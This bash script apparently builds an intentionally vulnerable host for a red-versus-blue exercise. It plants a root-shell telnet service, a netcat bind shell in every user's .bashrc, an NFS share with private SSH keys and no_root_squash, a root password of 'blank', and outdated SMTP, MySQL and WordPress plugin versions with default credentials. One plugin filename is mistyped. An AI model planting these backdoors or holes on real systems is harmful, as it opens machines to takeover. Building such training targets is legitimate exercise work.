#!/bin/bash

# telnet  to root shell
sudo apt update
sudo apt-get install telnetd -y
touch /usr/local/bin/telnet
echo "#!/bin/bash" > /usr/local/bin/telnet
echo "exec /bin/bash -i" >> /usr/local/bin/telnet
chmod +x /usr/local/bin/telnet
sudo systemctl restart inetutils-inetd
sudo iptables -A INPUT -p tcp --dport 23 -j ACCEPT
echo "telnet stream tcp nowait root /usr/sbin/telnetd telnetd -E  /usr/local/bin/telnet" >> /etc/inetd.conf

#nfs with ssh keys and creds
sudo apt install nfs-kernel-server -y
mkdir -p /srv/nfs
echo "/srv/nfs *(rw,sync,no_root_squash,no_subtree_check)" | sudo tee -a /etc/exports
sudo systemctl restart nfs-kernel-server

USERS=("aiden" "redhead" "megamind" "izzabizzradio" "maggiegz" "owendraingang" "drewupad" "cyfish" "ayyyydan" "eglick" "runner")
PASSWORD="Blueteamsux123!"

for USER in "${USERS[@]}"; do
  sudo useradd -m "$USER"
  sudo usermod -aG sudo "$USER"
  echo "$USER:$PASSWORD" | sudo chpasswd
done

echo "root:blank" | sudo chpasswd

for USER in "${USERS[@]}"; do
  sudo mkdir -p /home/$USER/.ssh
done

sudo mkdir -p /srv/nfs/.ssh

for USER in "${USERS[@]}"; do
  sudo ssh-keygen -t rsa -f /srv/nfs/.ssh/${USER}_id_rsa -N ""
  sudo cp /srv/nfs/.ssh/${USER}_id_rsa.pub /home/$USER/.ssh/authorized_keys
  sudo chown $USER:$USER /home/$USER/.ssh/authorized_keys
  sudo chmod 600 /home/$USER/.ssh/authorized_keys
  
  # bind shell in .bashrc
  echo -e "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9000 > /tmp/f & disown" | sudo tee -a /home/$USER/.bashrc
done

sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT

# root password in share
touch /srv/nfs/reminder
echo "in case you forget root password is blank" > /srv/nfs/reminder


sudo apt update
sudo apt install -y build-essential libtool automake libevent-dev zlib1g-dev bison libssl-dev libdb-dev git wget


wget https://github.com/OpenSMTPD/OpenSMTPD/releases/download/6.6.1p1/opensmtpd-6.6.1p1.tar.gz
tar -xzf opensmtpd-6.6.1p1.tar.gz
cd opensmtpd-6.6.1p1

# Install libasr if needed
if [ ! -f /usr/lib/libasr.so ]; then
  cd ..
  git clone https://github.com/OpenSMTPD/libasr.git
  cd libasr
  ./bootstrap
  ./configure
  make
  sudo make install
  sudo ldconfig
  cd ../opensmtpd-6.6.1p1
fi

# Configure with flags to fix the multiple definition errors
./bootstrap
./configure --with-cflags="-fcommon"
make
sudo make install

useradd -c "SMTP Daemon" -d /var/empty -s /sbin/nologin _smtpd
useradd -c "SMTPD Queue" -d /var/empty -s /sbin/nologin _smtpq
mkdir -p /var/empty
sudo iptables -A INPUT -p tcp --dport 25 -j ACCEPT
sudo mkdir -p /etc/mail
sudo touch /etc/mail/aliases
sudo rm /usr/local/etc/smtpd.conf

for USER in "${USERS[@]}"; do
  echo "$USER@ccso.org: $USER" | sudo tee -a /etc/mail/aliases > /dev/null
done

sudo tee /usr/local/etc/smtpd.conf <<EOF
#       \$OpenBSD: smtpd.conf,v 1.10 2018/05/24 11:40:17 gilles Exp $

# This is the smtpd server system-wide configuration file.
# See smtpd.conf(5) for more information.

table aliases file:/etc/mail/aliases

# To accept external mail, replace with: listen on all
listen on 0.0.0.0

action "local" mbox alias <aliases>
action "relay" relay

# Uncomment the following to accept external mail for domain "example.org"
match from any for domain "ccso.org" action "local"
match for local action "local"
match from local for any action "relay"
EOF

sudo tee /etc/systemd/system/opensmtpd.service <<EOF
[Unit]
Description=OpenSMTPD Mail Server
After=network.target

[Service]
ExecStart=/usr/local/sbin/smtpd
ExecReload=/bin/kill -HUP \$MAINPID
Type=forking
PIDFile=/run/opensmtpd.pid
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

sudo tee /etc/ssh/sshd_config <<EOF
# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication no

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
KbdInteractiveAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the KbdInteractiveAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via KbdInteractiveAuthentication may bypass
# the setting of "PermitRootLogin prohibit-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and KbdInteractiveAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
EOF

sudo tee /etc/ssh/sshd_config.d/60-cloudimg-settings.conf <<EOF
PasswordAuthentication yes
EOF

sudo apt install docker.io -y
sudo systemctl enable docker
sudo systemctl start docker
sudo docker pull mysql:5.7.13
mkdir -p ~/mysql-config
mkdir -p ~/mysql-data

# Step 4: Create a custom my.cnf file
echo "Creating custom my.cnf file..."
mkdir -p ~/mysql-config
cat <<EOF > ~/mysql-config/my.cnf
# Copyright (c) 2014, 2015, Oracle and/or its affiliates. All rights reserved.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; version 2 of the License.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301 USA

#
# The MySQL Community Server configuration file.
#
# For explanations see
# http://dev.mysql.com/doc/mysql/en/server-system-variables.html

[client]
port            = 3306
socket          = /var/run/mysqld/mysqld.sock

[mysqld_safe]
pid-file        = /var/run/mysqld/mysqld.pid
socket          = /var/run/mysqld/mysqld.sock
nice            = 0

[mysqld]
skip-host-cache
skip-name-resolve
user            = mysql
pid-file        = /var/run/mysqld/mysqld.pid
socket          = /var/run/mysqld/mysqld.sock
port            = 3306
basedir         = /usr
datadir         = /var/lib/mysql
tmpdir          = /tmp
lc-messages-dir = /usr/share/mysql
explicit_defaults_for_timestamp
secure_file_priv = ""

# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
bind-address    = 0.0.0.0

#log-error      = /var/log/mysql/error.log

# Disabling symbolic-links is recommended to prevent assorted security risks
symbolic-links=0

# * IMPORTANT: Additional settings that can override those from this file!
#   The files must end with '.cnf', otherwise they'll be ignored.
#
!includedir /etc/mysql/conf.d/
EOF

# Start MySQL container without mounting the my.cnf file
sudo docker run --name mysql-5.7.13 --privileged -e MYSQL_ROOT_PASSWORD=root -p 3306:3306 -v ~/mysql-data:/var/lib/mysql -d mysql:5.7.13

# Wait for MySQL to start
sleep 10

# Copy the custom my.cnf file into the MySQL container
sudo docker cp ~/mysql-config/my.cnf mysql-5.7.13:/etc/mysql/my.cnf
sudo docker exec -it mysql-5.7.13 chmod 777 /usr/lib/mysql/plugin/
sudo docker exec -it mysql-5.7.13 bash -c "echo 'deb http://archive.debian.org/debian jessie main' > /etc/apt/sources.list"
sudo docker exec -it mysql-5.7.13 bash -c "echo 'deb http://archive.debian.org/debian-security jessie/updates main' >> /etc/apt/sources.list"
sudo docker exec -it mysql-5.7.13 bash -c "echo 'Acquire::Check-Valid-Until \"false\";' > /etc/apt/apt.conf.d/10no--check-valid-until"
sudo docker exec -it mysql-5.7.13 apt-get install curl -y --force-yes

# Restart the MySQL container to apply the new configuration
sudo docker restart mysql-5.7.13

# Wait for MySQL to restart
sleep 10

# Create the WordPress database
sudo docker exec mysql-5.7.13 mysql -uroot -proot -e "CREATE DATABASE IF NOT EXISTS wordpress;"

# Start WordPress container
sudo docker pull wordpress:5.0
sudo docker run --name wordpress --link mysql-5.7.13:mysql -p 8080:80 --privileged -e WORDPRESS_DB_HOST=mysql:3306 -e WORDPRESS_DB_USER=root -e WORDPRESS_DB_PASSWORD=root -e WORDPRESS_DB_NAME=wordpress -d wordpress:5.0

# Create a custom wp-config.php file
cat > wp-config.php << EOF
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'root');
define('DB_HOST', 'mysql:3306');
define('DB_CHARSET', 'utf8mb4');
define('DB_COLLATE', '');

define('AUTH_KEY',         'uniquekey1');
define('SECURE_AUTH_KEY',  'uniquekey2');
define('LOGGED_IN_KEY',    'uniquekey3');
define('NONCE_KEY',        'uniquekey4');
define('AUTH_SALT',        'uniquesalt1');
define('SECURE_AUTH_SALT', 'uniquesalt2');
define('LOGGED_IN_SALT',   'uniquesalt3');
define('NONCE_SALT',       'uniquesalt4');

\$table_prefix = 'wp_';
define('WP_DEBUG', false);
if ( !defined('ABSPATH') )
    define('ABSPATH', dirname(__FILE__) . '/');
require_once(ABSPATH . 'wp-settings.php');
EOF

# Copy the config file to WordPress container
sudo docker cp wp-config.php wordpress:/var/www/html/wp-config.php
sudo docker exec wordpress chown www-data:www-data /var/www/html/wp-config.php

# Install WP-CLI
sudo docker exec wordpress curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
sudo docker exec wordpress chmod +x wp-cli.phar
sudo docker exec wordpress mv wp-cli.phar /usr/local/bin/wp

# Wait for WordPress to be ready
sleep 15

IP_ADDRESS=$(hostname -I | awk '{print $1}')

# Install WordPress core with admin user
sudo docker exec -u www-data wordpress wp core install \
    --url="http://${IP_ADDRESS}:8080" \
    --title="WordPress Site" \
    --admin_user="admin" \
    --admin_password="admin" \
    --admin_email="admin@example.com" \
    --skip-email

# Set up permalinks
sudo docker exec -u www-data wordpress wp rewrite structure '/%postname%/'

# Install and activate Astra theme
sudo docker exec -u www-data wordpress wp theme install twentytwenty --activate

# Install and activate plugins
sudo docker exec -u www-data wordpress wp plugin install classic-editor --activate

# Update site URL and home
sudo docker exec -u www-data wordpress wp option update siteurl "http://${IP_ADDRESS}:8080"
sudo docker exec -u www-data wordpress wp option update home "http://${IP_ADDRESS}:8080"

# Update admin password (optional)
sudo docker exec -u www-data wordpress wp user update admin --user_pass=admin

# Flush cache
sudo docker exec -u www-data wordpress wp cache flush

# Install additional plugins
sudo docker exec -u www-data wordpress wp plugin install jetpack --activate
sudo docker exec -u www-data wordpress wp plugin install woocommerce --activate
sudo docker exec -u www-data wordpress wp plugin install duplicator --activate

wget https://downloads.wordpress.org/plugin/wp-file-manager.6.0.zip
unzip wp-file-manager.6.0.zip
cd wp-file-manager/
sudo docker cp wp-file-manager-6.O.zip wordpress:/var/www/html/wp-content/plugins/wp-file-manager.6.0.zip
sudo docker exec -u www-data wordpress wp plugin install /var/www/html/wp-content/plugins/wp-file-manager.6.0.zip --activate
cd ..
rm -rf wp-file-manager
rm -f wp-file-manager-6.0.zip

# Clean up temporary files
rm -rf wp-file-manager
rm -f wp-file-manager.6.0.zip
rm -f wp-config.php

# Create sample page
sudo docker exec -u www-data wordpress wp post create \
    --post_type=page \
    --post_title='About Us' \
    --post_content='This is an automatically generated about page.' \
    --post_status=publish

# Enable and start required services
sudo systemctl enable inetutils-inetd
sudo systemctl start inetutils-inetd
sudo systemctl enable nfs-kernel-server
sudo systemctl start nfs-kernel-server
sudo systemctl daemon-reload
sudo systemctl enable opensmtpd
sudo systemctl start opensmtpd
